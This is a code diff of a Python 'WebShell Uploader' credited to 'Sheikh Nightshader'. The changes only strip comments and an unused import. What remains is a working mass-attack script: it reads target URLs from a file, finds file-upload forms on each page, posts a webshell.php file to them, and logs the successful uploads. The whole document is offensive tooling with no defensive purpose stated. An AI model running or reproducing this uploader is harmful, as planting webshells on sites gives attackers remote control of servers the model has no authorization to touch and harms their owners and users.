@@ -1,19 +1,15 @@
 import requests
 from bs4 import BeautifulSoup
 from colorama import Fore, Style, init
-from requests_toolbelt.multipart.encoder import MultipartEncoder
 import argparse
 import os
 
-# Initialize colorama
 init(autoreset=True)
 
-# Default values
 webshell_file = 'webshell.php'
 targets_file = 'targets.txt'
 log_file = 'success.txt'
 
-# Original Banner
 def print_banner():
     print(Fore.GREEN + Style.BRIGHT + """
     =========================================
@@ -22,7 +18,6 @@ def print_banner():
     =========================================
     """)
 
-# Parse command-line arguments
 def parse_args():
     parser = argparse.ArgumentParser(description='WebShell Uploader with Form Detection, By Sheikh Nightshader')
     parser.add_argument('--webshell', default=webshell_file, help='Path to the webshell file')
@@ -30,7 +25,6 @@ def parse_args():
     parser.add_argument('--log', default=log_file, help='Path to the log file')
     return parser.parse_args()
 
-# Function to find upload forms on the target page
 def find_upload_form(url):
     try:
         response = requests.get(url)
@@ -46,14 +40,11 @@ def find_upload_form(url):
         print(Fore.RED + f"Failed to access {url}: {e}")
     return None
 
-# Function to upload webshell to the found form
 def upload_webshell(url, form, webshell_file, log_file):
     try:
         action = form.get('action')
         if not action:
             action = url
-        
-        # Prepare the upload request
         with open(webshell_file, 'rb') as f:
             files = {'file': (os.path.basename(webshell_file), f)}
             response = requests.post(action, files=files)
@@ -68,13 +59,11 @@ def upload_webshell(url, form, webshell_file, log_file):
         print(Fore.RED + f"Failed to upload to {url}: {e}")
     return False
 
-# Main function
 def main():
     print_banner()
     
     args = parse_args()
 
-    # Validate files
     if not os.path.isfile(args.webshell):
         print(Fore.RED + f"Webshell file not found: {args.webshell}")
         return
@@ -89,10 +78,8 @@ def main():
         url = url.strip()
         if not url:
             continue
-        
         print(Fore.CYAN + f"Checking {url} for upload forms...")
         form = find_upload_form(url)
-
         if form:
             upload_webshell(url, form, args.webshell, args.log)
         else:
